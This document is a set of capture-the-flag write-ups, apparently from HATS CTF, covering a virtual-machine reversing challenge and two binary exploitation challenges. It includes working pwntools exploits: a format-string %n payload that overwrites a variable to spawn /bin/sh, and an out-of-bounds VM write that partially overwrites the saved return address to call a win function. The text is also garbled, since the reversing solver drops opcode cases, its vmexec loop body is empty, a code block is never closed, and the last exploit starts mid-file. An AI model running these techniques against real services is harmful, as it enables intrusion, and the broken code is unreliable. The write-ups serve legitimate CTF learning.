**Solution**

As usual, we start by running the binary provided first:  
```
Enter the key
aaaa
Verifying
Wrong key!
```

The binary seems to ask for a key, which can be assumed to be the flag. It then checks if the key is correct and outputs ```Wrong key!``` if the key is incorrect. Next, we analyze the source code:

Part of the code in **main**:
```c
char key[101]={},
     stack[101]={},
     input[1337]={},
     code1[] = "2u4mmimmiup2u6mimimimup2u7mmimmup2u6mmimmiup2u7mmmimup2u4mmmup2u7mmimmup2u6mimmmup2u6mmimmiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u5mup",
     code2[] = "2u5mmimimup2u6mmimmiup2u7mmmimup2u6mimmmiup2u6mmimimup2u7mimmmiup2u6mimmmiup2u6mimimimup2u6mmimimiup2u5mup",
     code3[] = "0r2u6mmr2u6mmimmiu0r2u5mimir2u5mmmu0r2u5mimr2u4mmmiu0r2u5mmir2u5mmmimiu0r2u5mmr2u4mimmiu0r2u4mimir2u7mimu0r2u4mimr2u6mmmmu0r2u4mmir2u4mimimimu0r2u4mmr2u5mimimimu0r2u7mir2u6mmimimu0r2u7mr2u5mimmmu0r2u6mir2u5mmmimu0r2u6mr2u5mmmiu0r2u5mir2u4mimimu0r2u5mr2u5mmimmiu9r2u5mmimu8r2u6mimmimu7r2u5mimmmu6r2u6mmimimiu5r2u7mmmmiu4r2u7mmimimiu3r2u5mmmmu2r2u5mmmimu1r2u4mmmmu0r2u4mimmmu",
     code4[] = "2u5mmimimiup2u7mmmimup2u6mimimimiup2u6mimimimup2u6mmimimiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u4mmmiup2u5mup",
     code5[] = "2u4mmimimup2u6mimimmup2u6mmmmiup2u6mmimimiup2u4mmmup2u7mmimup2u4mmmup";
 ```
As seen in the **main** function, The binary works by writing special lines of code, named ```code1[]``` to ```code5[]```, and passing them through the **vmstep** function with buffers to be written to, such as `stack` or `key`. We can see that `code1[]`, `code2[]`, `code4[]` and `code5[]` are used to output statements after running the binary. 

 **vmstep** function:
 ```c
 int vmstep(char op,char* stack){
    switch(op | 0x20){
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
            ax = (op | 0x20) - 0x30;
            break;
        case 'a':
            ax += stack[sp];
            break;
        case 'd':
            --ax;
            break;
        case ' ':
        case 'e':
            return 0;
        case 'i':
            ++ax;
            break;
        case 'j':
            ip += ax - 1;
            break;
        case 'm':
            ax *= stack[sp];
            break;
        case 'p':
            printf("%c",stack[sp]);
            break;
        case 'r':
            sp = ax;
            break;
        case 's':
            ax -= stack[sp];
            break;
        case 'u':
            stack[sp] = ax;
            break;
        case 'z':
            if(stack[sp] == 0){
                ip += ax - 1;
            }
            break;
        default:
            break;
    }
    return 1;
}
```

There are 4 special variables that are used in **vmstep** and **vmexec**:
* `ip` represents the instruction pointer, basically a variable to count the number of instructions.
* `sp` is the stack pointer, which is used to overwrite/change values in the stack
* `ax` is the AX register, used to perform instructions such as changing the value of `sp` or the values in the stack
* `stack` represents the buffer that is passed into the functions, namely the `key` or `stack` in **main**. Memory in these buffers will be changed.  

Each letter or character in the codes represents an instruction that changes one of these 4 variables in some way. For example, `p` is used to execute `printf("%c", stack[sp])`.

Part of the code in **main**:
```c
    int i;
    vmexec(code1,stack);
    scanf("%1337s", &input);
    vmexec(code2,stack);
    vmexec(input,key);
    vmexec(code3,stack);
    for(i=0;i<100;++i){
        if(key[i] == '\x00' && stack[i] == '\x00'){
            i = -1;
            break;
        }
        if(key[i] != stack[i] + i){
            break;
        }
    }
```

In the above code, the binary stores our input in `key`. `vmexec(code3,stack);` then changes the values in the `stack`. The binary proceeds to check if `key[i]` is equal to `stack[i] + i`. As `key` is the flag, we can assume that `stack[i] + i` represents each individual character code in the flag after `vmexec(code3,stack);` is run.

To solve the challenge, we simply run `vmexec(code3, stack);` and print out the ASCII characters represented by `stack[i] + i`. Below is the final code to solve the challenge:
```c
 
#include <stdio.h>

int ip = 0;
int sp = 0;
int ax = 0;
int vmstep(char op,char* stack){
    switch(op | 0x20){
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
            ax = (op | 0x20) - 0x30;
            break;
        case 'a':
            ax += stack[sp];
            break;
        case 'd':
            --ax;
            break;
        case ' ':
        case 'e':
            return 0;

            ++ax;
            break;
        case 'j':
            ip += ax - 1;
            break;
        case 'm':
            ax *= stack[sp];
            break;
        case 'p':
            printf("%c",stack[sp]);
            break;
        case 'r':
            sp = ax;
            break;

    }
    return 1;
}
void vmexec(char* code, char* stack){

    while(1){

    }
}

**Solution**

This challenge is a standard format string challenge. 

Here's the simplified decompilation of **main**:
```c
  magic = 0;
  read(0,input,0x400);
  printf(input);
  if (magic != 0) {
    system("/bin/sh");
  }
```

Obviously, the line `printf(input);` contains a format string vulnerability. The format string argument was missing from `printf`, which could be exploited to print and overwrite addresses on the stack.

The objective of the challenge was to overwrite the value of `magic`, which would instantly give us a shell. However, the address of `magic` which was `0x0060106c`, contained a null byte, which would cause `printf` to stop "executing" our payload once the null byte was reached.

To overcome this, the address of `magic` can be placed last in the payload. We can use the format specifier `%15$n` to overwrite `magic`, where `magic` is the 15th value on the stack to be printed. This ensures `magic` is overwritten before the null byte is reached.

The payload contains the following:
1. `"%x "*21`: Prints the first 21 arguments on the stack in hex. It allows us to locate the address of `magic` in the stack after including it in our payload.
2. `"%15$n "`: The format specifier `%n` overwrites the next address on the stack with the number of bytes printed. This is used to overwrite `magic` with the number of bytes currently printed.
3. `"BBB"`: This is used to align stack, ensuring the address of `magic` isn't split up.
4. The address of `magic`.

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./ezprintf",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "challs.hats.sg",
    "PORT" : 1304,
}

def exploit(p):
	magic = elf.symbols['magic'] #0x0060106c
	
	payload = "%x "*21 + "%15$n "
	payload += "BBB" + p64(magic)

	sl(payload)
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
 ```

**Solution**

Before reading this writeup, I suggest reading the writeup for **[babyvm-re](/ctf/HATS-CTF/#babyvm-re-reversing)** if you have not done so. The explanation of source code and "reversing part" of the challenge is explained there.

We start by running `checksec` on the binary:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Note that both ASLR and PIE are enabled. ASLR randomizes the address of the stack, heap and libc, while PIE randomizes the address of .text section by initializing a random offset everytime the binary is run. This means the address of user defined functions in code, such as **win** or **main**, will not be fixed.

Here are the important parts of the source code:

**vmstep** function:
```c
int vmstep(char op,char* stack){
    switch(op | 0x20){
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
            ax = (op | 0x20) - 0x30;
            break;
        case 'a':
            ax += stack[sp];
            break;
        case 'd':
            --ax;
            break;
        case ' ':
        case 'e':
            return 0;
        case 'i':
            ++ax;
            break;
        case 'j':
            ip += ax - 1;
            break;
        case 'm':
            ax *= stack[sp];
            break;
        case 'p':
            printf("%c",stack[sp]);
            break;
        case 'r':
            sp = ax;
            break;
        case 's':
            ax -= stack[sp];
            break;
        case 'u':
            stack[sp] = ax;
            break;
        case 'z':
            if(stack[sp] == 0){
                ip += ax - 1;
            }
            break;
        default:
            break;
    }
    return 1;
}
```

Part of the code in **main**:
```c
    char key[101]={},
         stack[101]={},
         input[1337]={},
         code1[] = "2u4mmimmiup2u6mimimimup2u7mmimmup2u6mmimmiup2u7mmmimup2u4mmmup2u7mmimmup2u6mimmmup2u6mmimmiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u5mup",

         code3[] = "0r2u6mmr2u6mmimmiu0r2u5mimir2u5mmmu0r2u5mimr2u4mmmiu0r2u5mmir2u5mmmimiu0r2u5mmr2u4mimmiu0r2u4mimir2u7mimu0r2u4mimr2u6mmmmu0r2u4mmir2u4mimimimu0r2u4mmr2u5mimimimu0r2u7mir2u6mmimimu0r2u7mr2u5mimmmu0r2u6mir2u5mmmimu0r2u6mr2u5mmmiu0r2u5mir2u4mimimu0r2u5mr2u5mmimmiu9r2u5mmimu8r2u6mimmimu7r2u5mimmmu6r2u6mmimimiu5r2u7mmmmiu4r2u7mmimimiu3r2u5mmmmu2r2u5mmmimu1r2u4mmmmu0r2u4mimmmu",
         code4[] = "2u5mmimimiup2u7mmmimup2u6mimimimiup2u6mimimimup2u6mmimimiup2u4mmmup2u6mimmimiup2u6mmimmiup2u7mimmmiup2u4mmmiup2u5mup",
         code5[] = "2u4mmimimup2u6mimimmup2u6mmmmiup2u6mmimimiup2u4mmmup2u7mmimup2u4mmmup";
    int i;
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    vmexec(code1,stack);
    scanf("%1337s", &input);
    vmexec(code2,stack);
    vmexec(input,key);
    vmexec(code3,stack);
```

The challenge has a vulnerability similar to a buffer overflow. The statement `vmexec(input,key);` allows us to write instructions to overwrite values in the `key` buffer. However, as **vmstep** does not check `ax` to ensure its value is within range of the buffer, we are essentially able to overwrite any location in memory relative to the location of `key` in memory. 

These instructions are essential to exploiting the vulnerability:
* `0` sets the value of `ax` to 0.
* `d` decreases the value of `ax` by 1.
* `i` increases the value of `ax` by 1.
* `r` sets the value of `sp` to the value of `ax`. Basically, `sp = ax`.
* `a` adds the value at `stack[sp]` to `ax`. Basically, `ax += stack[sp]`.
* `u` sets the value at `stack[sp]` to the value of `ax`. Basically, `stack[sp] = ax`.

Here's an example to help you visualize the vulnerability. If the input contains: 
```python 
'0' + 'i'*999 + 'ru'
```
We would overwrite `key[999]` with the value 999. As seen in the example, we are able to overwrite any area in memory as long as our payload is not more than 1337 characters.

The exploit works by overwriting the return instruction pointer (RIP) with the address of **win**, which would give us a shell. Developing the exploit has 3 stages:

1. **Finding the offset of RIP**  
We can find the offset of RIP from the `key` buffer by a trial and error process. This can be done by overwriting every value up to a certain offset and using gdb to check if RIP is overwritten. We increase the offset if gdb is not overwritten, and decrease if it is overwritten. Keep in mind that the address of RIP would be smaller than the address of `key`, hence the offset should be negative.

2. **Calculating the address of win**  
Due to PIE, the address of **win** will change everytime the binary is run. This means that the base offset of the address will change and only the last 2 bytes are known.   

   Luckily for us, when we overwrite RIP, it contains the address of `main + 1501`. This means we only have to overwrite the last 2 bytes of RIP to call **win**, thus bypassing PIE. The last byte of **win**, which is fixed, is 0xa1. We can calculate the second last byte using `offset = (saved_rip - win) >> 8`, where `saved_rip` is the address of `main + 1501` and `win` is the address of **win**. This works as the difference between **win** and `main + 1501` is constant regardless of PIE.

3. **Overwriting RIP with the address of win**  
An offset of 103 overwrites the second last byte of RIP while 104 overwrites the last byte. The following code overwrites the last 2 bytes of RIP to become the address of **win**:
   ```python
    payload = '0' + 'd'*103 + 'r' + "0au" + 'd'*offset + 'u'
    payload += '0' + 'd'*104 + 'r' + '0' + 'i'*0xa1 + 'u'
   ```    

Here's the final exploit used to solve the challenge:
```python

}

def exploit(p):
    win = elf.symbols['win']
    saved_rip = elf.symbols['main']+1501
    offset = (saved_rip - win) >> 8

    payload = '0' + 'd'*103 + 'r' + "0au" + 'd'*offset + 'u'
    payload += '0' + 'd'*104 + 'r' + '0' + 'i'*0xa1 + 'u'
